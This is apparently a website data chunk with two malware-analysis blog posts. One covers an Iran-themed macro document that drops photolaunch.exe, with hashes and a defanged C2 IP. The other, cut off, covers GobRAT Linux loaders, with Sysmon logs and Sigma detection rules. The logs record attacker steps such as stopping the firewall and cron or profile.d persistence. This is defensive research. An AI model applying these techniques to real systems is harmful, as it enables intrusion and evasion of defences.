"use strict";(self.webpackChunkjstnk=self.webpackChunkjstnk||[]).push([[2915],{4618:function(e){e.exports=JSON.parse('{"blogPosts":[{"id":"Malicious-Iran-Document-APT","metadata":{"permalink":"/jstnk9/research/Malicious-Iran-Document-APT","source":"@site/research/2023-10-20-Malicious-Iran-Document-APT/2023-10-20-Malicious-Iran-Document-APT.md","title":"Malicious document identified in the conflict Israel & Gaza themed about terrorist organizations related to Iran","description":"Summary","date":"2023-10-20T00:00:00.000Z","formattedDate":"October 20, 2023","tags":[{"label":"threat hunting","permalink":"/jstnk9/research/tags/threat-hunting"},{"label":"detection","permalink":"/jstnk9/research/tags/detection"},{"label":"analysis","permalink":"/jstnk9/research/tags/analysis"},{"label":"research","permalink":"/jstnk9/research/tags/research"},{"label":"Iran","permalink":"/jstnk9/research/tags/iran"},{"label":"Israel","permalink":"/jstnk9/research/tags/israel"},{"label":"Gaza","permalink":"/jstnk9/research/tags/gaza"},{"label":"APT","permalink":"/jstnk9/research/tags/apt"}],"readingTime":4.615,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"nextItem":{"title":"Dissecting GobRAT behaviors - Linux malware","permalink":"/jstnk9/research/GobRAT-Malware"}},"content":"## Summary\\r\\n\\r\\nOn October 16, a malicious file that could be related to the current Israel-Gaza conflict was uploaded to VT. The document is related to [Joe Truzman](https://twitter.com/JoeTruzman) publication \\"[IRAN AND ITS NETWORK OF NINETEEN TERRORIST ORGANIZATIONS ON ISRAEL\'S BORDERS](https://www.fdd.org/iranbackedterrorists/)\\" on [fdd.org](https://www.fdd.org/) and talks about terrorist organizations that receive funding, training, and weapons from Iran\'s Islamic Revolutionary Guard Corps.\\r\\n\\r\\nThe actor behind this document could not be determined, however, due to the type of document and the characteristics analyzed, it could be an APT. As for the victims, it could be Israel institutions.\\r\\n\\r\\n![vt](https://jstnk9.github.io/jstnk9/img/research-iran-apt/VTresults.PNG)\\r\\n\\r\\n:::warning\\r\\n\\r\\nInformation about the origin and destination of the document could not be confirmed. What has been described in relation to suspected sponsors and victims is just conjecture.\\r\\n\\r\\n:::\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Analysis\\r\\n\\r\\n### Malicious .docm\\r\\n\\r\\nThe basic static information of the sample analyzed is the following\\r\\n\\r\\n| Field      | Value |\\r\\n| ----------- | ----------- |\\r\\n| File name      | Unknown       |\\r\\n| Type   |  Microsoft Word 2007+       |\\r\\n| MD5   | f5953df9fd1129ce5e1a1a1250b367d9       |\\r\\n| SHA1   | 277744c18aebdd36825faa0f2e94e0c550552674        |\\r\\n| SHA256   | 9d78c81622fbb5e6ddb79b659f89d7b26b876dbfd907cb1c42b4be254d69b860        |\\r\\n| File size   |   10.97 MB (11504742 bytes)      |\\r\\n|  \ud83d\udd17 VT | https://www.virustotal.com/gui/file/9d78c81622fbb5e6ddb79b659f89d7b26b876dbfd907cb1c42b4be254d69b860 |\\r\\n\\r\\n![static01](https://jstnk9.github.io/jstnk9/img/research-iran-apt/basicproperties.PNG)\\r\\n\\r\\nThis document includes a macro named `NewMacros.bas` that incorporates the `AutoOpen` function in order to execute the embedded macro.\\r\\n\\r\\n![static02](https://jstnk9.github.io/jstnk9/img/research-iran-apt/macrosVT.PNG)\\r\\n\\r\\n![oleid](https://jstnk9.github.io/jstnk9/img/research-iran-apt/oleid.PNG)\\r\\n\\r\\nThere are different functions implemented during the execution of macros.\\r\\n\\r\\n![ole1](https://jstnk9.github.io/jstnk9/img/research-iran-apt/ole.PNG)\\r\\n\\r\\n![ole2](https://jstnk9.github.io/jstnk9/img/research-iran-apt/ole2.PNG)\\r\\n\\r\\n![ole3](https://jstnk9.github.io/jstnk9/img/research-iran-apt/ole4.PNG)\\r\\n\\r\\nThe document appears to have been created on October 11 at 00:48:00 UTC, 4 days after Hamas began its operation against Israel.\\r\\n\\r\\n![static03](https://jstnk9.github.io/jstnk9/img/research-iran-apt/exif.PNG)\\r\\n\\r\\nWhen the document is opened, an image is displayed that asks to enable the content in order to view the content. Once opened, the information related to the article described above \\"[IRAN AND ITS NETWORK OF NINETEEN TERRORIST ORGANIZATIONS ON ISRAEL\'S BORDERS](https://www.fdd.org/iranbackedterrorists/)\\" is dumped into the Word document.\\r\\n\\r\\n![static04](https://jstnk9.github.io/jstnk9/img/research-iran-apt/word2pages.png)\\r\\n\\r\\nThe rest of the document has similar content to Joe Truzman\'s article, which includes information about terrorist groups such as leaders, weapons used, areas of operation, origin, etc.\\r\\n\\r\\n![groups](https://jstnk9.github.io/jstnk9/img/research-iran-apt/groups.PNG)\\r\\n\\r\\n![groupscontext](https://jstnk9.github.io/jstnk9/img/research-iran-apt/groupscontext.PNG)\\r\\n\\r\\n### Relations\\r\\n\\r\\nDuring the execution of the word document, there was a file dropped in the path `C:\\\\ProgramData\\\\`. The name of the file created was `photolaunch.exe` and it contained the following information.\\r\\n\\r\\n![procmon](https://jstnk9.github.io/jstnk9/img/research-iran-apt/procmon_creationfile.PNG)\\r\\n\\r\\n| Field      | Value |\\r\\n| ----------- | ----------- |\\r\\n| File name      | photolaunch.exe       |\\r\\n| Type   |  \\tPE32 executable (GUI) Intel 80386, for MS Windows       |\\r\\n| MD5   | 3730af498ac2629379bcc119d0ce860d       |\\r\\n| SHA1   | 4acab0b02edf90cbdb1306732fa00978a3db3af6        |\\r\\n| SHA256   | afc78f0aee24bf8c3a85f184f7fd3b940d8431ec6d473ecb7a3fd31e2143490c        |\\r\\n| File size   |  392.00 KB (401408 bytes)     |\\r\\n|  \ud83d\udd17 VT | https://www.virustotal.com/gui/file/afc78f0aee24bf8c3a85f184f7fd3b940d8431ec6d473ecb7a3fd31e2143490c|\\r\\n\\r\\nAt the time of the analysis, only 6 antivirus engines detected this file as malicious\\r\\n\\r\\n![malicious](https://jstnk9.github.io/jstnk9/img/research-iran-apt/maliciousfile.PNG)\\r\\n\\r\\nDuring the execution of this file, communications with the IP address `154.3.8[.]144` had place.\\r\\n\\r\\n![malicious](https://jstnk9.github.io/jstnk9/img/research-iran-apt/connectionROIbinario.PNG)\\r\\n\\r\\nIn VT, it can also be seen that during the execution of the binary, there are multiple HTTP connections against the mentioned IP address.\\r\\n\\r\\n![malicious](https://jstnk9.github.io/jstnk9/img/research-iran-apt/vt_maliciousfile_connections.PNG)\\r\\n\\r\\nRegarding the information related to the IP address in shodan, it has been possible to verify that ports 80 and 3389 (RDP) exist open.\\r\\n\\r\\n![shodan](https://jstnk9.github.io/jstnk9/img/research-iran-apt/ipinformation_shodan.PNG)\\r\\n\\r\\nSomething that is interesting is that `photolaunch.exe` file contains a [comment](https://www.virustotal.com/gui/file/afc78f0aee24bf8c3a85f184f7fd3b940d8431ec6d473ecb7a3fd31e2143490c/community) in VT Community from user [Thor APT Scanner](https://www.nextron-systems.com/thor/). This comment is related to a YARA rule from [Valhalla](https://valhalla.nextron-systems.com/info/rule/APT_MAL_ViciousPanda_Chinoxy_Mar20_1) that identifies activity from the adversary `Vicious Panda`, whose origin is Chinese.\\r\\n\\r\\n![shodan](https://jstnk9.github.io/jstnk9/img/research-iran-apt/yararule.png)\\r\\n\\r\\nIn addition to the `photolaunch.exe` file, there are two other Office files (in this case `.xls`) that also make connections against `154.3.8[.]144`. The curious thing is that both files were uploaded on the same day, October 16, as the initial `.docm` sample.\\r\\n\\r\\n![shodan](https://jstnk9.github.io/jstnk9/img/research-iran-apt/communicating_files.PNG)\\r\\n\\r\\n#### xls file\\r\\n\\r\\n| Field      | Value |\\r\\n| ----------- | ----------- |\\r\\n| File name      | Unknown       |\\r\\n| Type   |  \\t\\tMicrosoft Excel 2007+       |\\r\\n| MD5   | 21aa62da5c3cf29e21e395d140dee815       |\\r\\n| SHA1   | f622d6b2430ec6265925675976fdb2b74fb05323        |\\r\\n| SHA256   | 2ff60c2f845decfd4fb3a305189da6797ba634aa442efc3bca5ecfbfc80b3147        |\\r\\n| File size   | \\t7.79 MB (8166215 bytes)     |\\r\\n|  \ud83d\udd17 VT | https://www.virustotal.com/gui/file/2ff60c2f845decfd4fb3a305189da6797ba634aa442efc3bca5ecfbfc80b3147 |\\r\\n\\r\\nThe described file during the execution, drops the next file\\r\\n\\r\\n| Field      | Value |\\r\\n| ----------- | ----------- |\\r\\n| File name      | 65870000       |\\r\\n| Type   |  \\t\\tMicrosoft Excel 2007+       |\\r\\n| MD5   | 0db7b376aeb128beab77c6049cb7ee0e       |\\r\\n| SHA1   | 6282c8a69d6e1a5f9094e443d2701134087b0665        |\\r\\n| SHA256   | cc20126ad46d5fa2508d7a11c5ca42636208281f29446d4cb90ec1eaffcadfa6        |\\r\\n| File size   | 8.15 MB (8550011 bytes)     |\\r\\n|  \ud83d\udd17 VT | https://www.virustotal.com/gui/file/cc20126ad46d5fa2508d7a11c5ca42636208281f29446d4cb90ec1eaffcadfa6 |\\r\\n\\r\\nTaking a look at the excel file `2ff60c2f845decfd4fb3a305189da6797ba634aa442efc3bca5ecfbfc80b3147`, we see that it contains the following information when opened by the user.\\r\\n\\r\\n![excelfile](https://jstnk9.github.io/jstnk9/img/research-iran-apt/excel.PNG)\\r\\n\\r\\nThe title of the document is \\"research results\\" and the information shown in the columns, when translated from Arabic to English, is related as follows from left to right.\\r\\n\\r\\n* A: The series\\r\\n* B: Listing date\\r\\n* C: Arabic name\\r\\n* D: Latin name\\r\\n* E: date of birth\\r\\n* F: Nationality\\r\\n* G: the list\\r\\n\\r\\nAs an example, the first row contains the next information\\r\\n\\r\\n```\\r\\n1\\t\u0660\u0668-\u0660\u0665-\u0662\u0660\u0661\u0667\\t\\tA RASID BIN ISMAIL\\t\u0660\u0661-\u0660\u0667-\u0661\u0669\u0667\u0662\\t\u0645\u0627\u0644\u064a\u0632\u0649\\t\u0645\u0646\u0639 \u062f\u062e\u0648\u0644\\r\\n```\\r\\n\\r\\nSimilar to the `.docm` file, this also includes a macro almost identical to the one seen previously. And during the execution, it drops the `photolaunch.exe` file mentioned before.\\r\\n\\r\\n![excelfile](https://jstnk9.github.io/jstnk9/img/research-iran-apt/macro_excel.PNG)\\r\\n\\r\\n## IOCs\\r\\n\\r\\n| IOC      | Description |\\r\\n| ----------- | ----------- |\\r\\n| 9d78c81622fbb5e6ddb79b659f89d7b26b876dbfd907cb1c42b4be254d69b860      | Initial file with the theme of terrorist groups in Iran       |\\r\\n| 2ff60c2f845decfd4fb3a305189da6797ba634aa442efc3bca5ecfbfc80b3147   |  \\tMalicious `.xls` file with information about people        |\\r\\n| cc20126ad46d5fa2508d7a11c5ca42636208281f29446d4cb90ec1eaffcadfa6   |  \\tFile with filename `65870000` dropped by `2ff60c2f845decfd4fb3a305189da6797ba634aa442efc3bca5ecfbfc80b3147` during the execution        |\\r\\n| afc78f0aee24bf8c3a85f184f7fd3b940d8431ec6d473ecb7a3fd31e2143490c   | `photolaunch.exe` malicious file dropped by the `.docm` and `.xls` files during the execution      |\\r\\n| `154.3.8[.]144`   | IP address contacted by all the samples analyzed here        |\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/"},{"id":"GobRAT-Malware","metadata":{"permalink":"/jstnk9/research/GobRAT-Malware","source":"@site/research/2023-05-30-GobRAT-Linux-Malware/2023-05-30-GobRAT-Linux-Malware.md","title":"Dissecting GobRAT behaviors - Linux malware","description":"Summary","date":"2023-05-30T00:00:00.000Z","formattedDate":"May 30, 2023","tags":[{"label":"threat hunting","permalink":"/jstnk9/research/tags/threat-hunting"},{"label":"detection","permalink":"/jstnk9/research/tags/detection"},{"label":"analysis","permalink":"/jstnk9/research/tags/analysis"},{"label":"research","permalink":"/jstnk9/research/tags/research"},{"label":"GobRAT","permalink":"/jstnk9/research/tags/gob-rat"},{"label":"malware","permalink":"/jstnk9/research/tags/malware"},{"label":"sigma","permalink":"/jstnk9/research/tags/sigma"}],"readingTime":19.02,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"Malicious document identified in the conflict Israel & Gaza themed about terrorist organizations related to Iran","permalink":"/jstnk9/research/Malicious-Iran-Document-APT"},"nextItem":{"title":"Analyzing AsyncRAT distributed in Colombia by Blind Eagle","permalink":"/jstnk9/research/AsyncRAT-Analysis"}},"content":"## Summary\\r\\n\\r\\n[JPCERT/CC discovered](https://blogs.jpcert.or.jp/en/2023/05/gobrat.html) recently attacks that infected routers in Japan with malware around February 2023.\\r\\n\\r\\n![graph](https://jstnk9.github.io/jstnk9/img/research-gobrat/gobrat_graph.png)\\r\\n\\r\\nThis analysis is focused in the loaders discovered by them\\r\\n\\r\\n* `60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3`\\r\\n* `3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1`\\r\\n\\r\\nSome of the behaviors identified in the routers, are too generic, which means that can be used in Linux endpoints intrusions too. For that reason, I decided to analyze the samples and contribute to the Sigma community to idenfity new detection opportunities based on the samples and the analysis of JPCERT/CC.\\r\\n\\r\\n:::info\\r\\n\\r\\nThe objective of the analysis is to provide information about the execution of these loaders and how we can detect them using [Sigma Rules](https://github.com/SigmaHQ/sigma)\\r\\n\\r\\n:::\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Analysis\\r\\n\\r\\nDuring this section, you will see telemetry based on `Sysmon` events and sigma rules that are triggering the behaviors.\\r\\n\\r\\n### Suspicious File Creation in Profile Folder\\r\\n\\r\\nA file dropped by the loader is created in the `/etc/profile.d` path with the goal of persist. The file created is a `.sh` which will be executed during the start of login shells. That path is used to create persistence in the system by threat actors.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>11</EventID>\\r\\n        <Version>2</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>11</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16919</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff05-6475-f547-38be1a560000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26546</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"TargetFilename\\">/etc/profile.d/sshdaemon.sh</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nI\'ve created a sigma rule that can help us to detect this behavior, since it can be used by multiple threat actors.\\r\\n\\r\\n```yml\\r\\ntitle: Suspicious File Creation in Profile Folder\\r\\nid: 13f08f54-e705-4498-91fd-cce9d9cee9f1\\r\\nstatus: experimental\\r\\ndescription: Detects the creation of files under profile.d path\\r\\nreferences:\\r\\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\\r\\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\\r\\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\\r\\ndate: 2023/30/05\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: file_event\\r\\ndetection:\\r\\n    selection_path:\\r\\n        TargetFilename|contains: \'/etc/profile.d/\'\\r\\n    selection_extension:\\r\\n        TargetFilename|endswith: \'.sh\'\\r\\n    condition: all of selection_*\\r\\nfalsepositives:\\r\\n    - Legitimate file creation\\r\\nlevel: medium\\r\\n```\\r\\n\\r\\n### Discovery Information About Operantig System in Silent Mode\\r\\n\\r\\nOne of the goals of these threat actors was do different tasks in silent mode. For that purpose, they have used `grep` with the parameter `-iq` to avoid print results in the terminal. \\r\\n\\r\\nThe use of `grep` make sense when you see the code and what they are trying to do. Next image is a piece of code of these loaders.\\r\\n\\r\\n![grep](https://jstnk9.github.io/jstnk9/img/research-gobrat/grep_use.png)\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16776</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff05-6475-81cf-b73487550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26562</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/grep</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">grep -iq aarch64</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/opt</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff05-6475-f547-38be1a560000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26546</Data>\\r\\n        <Data Name=\\"ParentImage\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/bin/sh</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nA sigma rule that I thought might help us with this is following all the checks made by this loader is the next one.\\r\\n\\r\\n```yml\\r\\ntitle: Discovery Information About Operantig System in Silent Mode\\r\\nid: d27ab432-2199-483f-a297-03633c05bae6\\r\\nstatus: experimental\\r\\ndescription: Detects the use of grep to identify information about the system using the parameter -q to do it in silent mode\\r\\nreferences:\\r\\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\\r\\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\\r\\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\\r\\ndate: 2023/30/05\\r\\ntags:\\r\\n    - attack.discovery\\r\\n    - attack.t1082\\r\\nlogsource:\\r\\n    category: process_creation\\r\\n    product: linux\\r\\ndetection:\\r\\n    selection_process:\\r\\n        Image|endswith: \'/grep\'\\r\\n        CommandLine|contains: \'-iq\'\\r\\n    selection_architecture:\\r\\n        CommandLine|contains:\\r\\n            - \'aarch64\'\\r\\n            - \'armv7\'\\r\\n            - \'x86_64\'\\r\\n            - \'arm*\'\\r\\n            - \'mips*\'\\r\\n            - \'i386\'\\r\\n            - \'i686\'\\r\\n            - \'AArch64\'\\r\\n            - \'ARMv7\'\\r\\n            - \'arm\'\\r\\n            - \'mips\'\\r\\n            - \'mipsel\'\\r\\n            - \'mips64\'\\r\\n            - \'mips64el\'\\r\\n    condition: all of selection_*\\r\\nfalsepositives:\\r\\n    - Unknown\\r\\nlevel: low\\r\\n```\\r\\n\\r\\n### Persistence Via Cron Files\\r\\n\\r\\nThere is a `crontab` execution of a crontab file which was dropped. During the execution of `crontab` to load that file, there is a file creation that is interesting to see that there was a crontab execution to persist.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>11</EventID>\\r\\n        <Version>2</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>11</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16873</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff13-6475-f59c-766f18560000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26604</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/crontab</Data>\\r\\n        <Data Name=\\"TargetFilename\\">/var/spool/cron/crontabs/tmp.0iiGrT</Data>\\r\\n        <Data Name=\\"CreationUtcTime\\">2023-05-30 13:50:11.585</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nIt was used to create persistence in the system. In order to detect that behavior there is a [public sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/file_event/file_event_lnx_persistence_cron_files.yml) rule that can help us.\\r\\n\\r\\n```yaml\\r\\ntitle: Persistence Via Cron Files\\r\\nid: 6c4e2f43-d94d-4ead-b64d-97e53fa2bd05\\r\\nstatus: test\\r\\ndescription: Detects creation of cron file or files in Cron directories which could indicates potential persistence.\\r\\nreferences:\\r\\n    - https://github.com/microsoft/MSTIC-Sysmon/blob/f1477c0512b0747c1455283069c21faec758e29d/linux/configs/attack-based/persistence/T1053.003_Cron_Activity.xml\\r\\nauthor: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC\\r\\ndate: 2021/10/15\\r\\nmodified: 2022/12/31\\r\\ntags:\\r\\n    - attack.persistence\\r\\n    - attack.t1053.003\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: file_event\\r\\ndetection:\\r\\n    selection1:\\r\\n        TargetFilename|startswith:\\r\\n            - \'/etc/cron.d/\'\\r\\n            - \'/etc/cron.daily/\'\\r\\n            - \'/etc/cron.hourly/\'\\r\\n            - \'/etc/cron.monthly/\'\\r\\n            - \'/etc/cron.weekly/\'\\r\\n            - \'/var/spool/cron/crontabs/\'\\r\\n    selection2:\\r\\n        TargetFilename|contains:\\r\\n            - \'/etc/cron.allow\'\\r\\n            - \'/etc/cron.deny\'\\r\\n            - \'/etc/crontab\'\\r\\n    condition: 1 of selection*\\r\\nfalsepositives:\\r\\n    - Any legitimate cron file.\\r\\nlevel: medium\\r\\n\\r\\n```\\r\\n\\r\\n### Disable Or Stop Services\\r\\n\\r\\nStop the firewall service is one of the goals during the execution. They have used `disable` and `stop` options. \\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16755</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff05-6475-9d3b-864902560000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26548</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/systemctl</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">systemctl stop firewalld.service</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/opt</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff05-6475-f547-38be1a560000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26546</Data>\\r\\n        <Data Name=\\"ParentImage\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/bin/sh</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nWhether the option is to `disable` or `stop`, the following [public sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_services_stop_and_disable.yml) rule can help you detect this behavior.\\r\\n\\r\\n\\r\\n```yml\\r\\ntitle: Disable Or Stop Services\\r\\nid: de25eeb8-3655-4643-ac3a-b662d3f26b6b\\r\\nstatus: experimental\\r\\ndescription: Detects the usage of utilities such as \'systemctl\', \'service\'...etc to stop or disable tools and services\\r\\nreferences:\\r\\n    - https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html\\r\\nauthor: Nasreddine Bencherchali (Nextron Systems)\\r\\ndate: 2022/09/15\\r\\ntags:\\r\\n    - attack.defense_evasion\\r\\nlogsource:\\r\\n    category: process_creation\\r\\n    product: linux\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|endswith:\\r\\n            - \'/service\'\\r\\n            - \'/systemctl\'\\r\\n            - \'/chkconfig\'\\r\\n        CommandLine|contains:\\r\\n            - \'stop\'\\r\\n            - \'disable\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Legitimate administration activities\\r\\nlevel: medium\\r\\n```\\r\\n\\r\\n### Crontab Enumeration\\r\\n\\r\\nThe use of `crontab -l` is not malicious for itself, however is interesting to identify this behavior. They used it during the infection.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16863</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff13-6475-f53c-414b9d550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26600</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/crontab</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">crontab -l</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/opt</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff05-6475-f547-38be1a560000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26546</Data>\\r\\n        <Data Name=\\"ParentImage\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/bin/sh</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    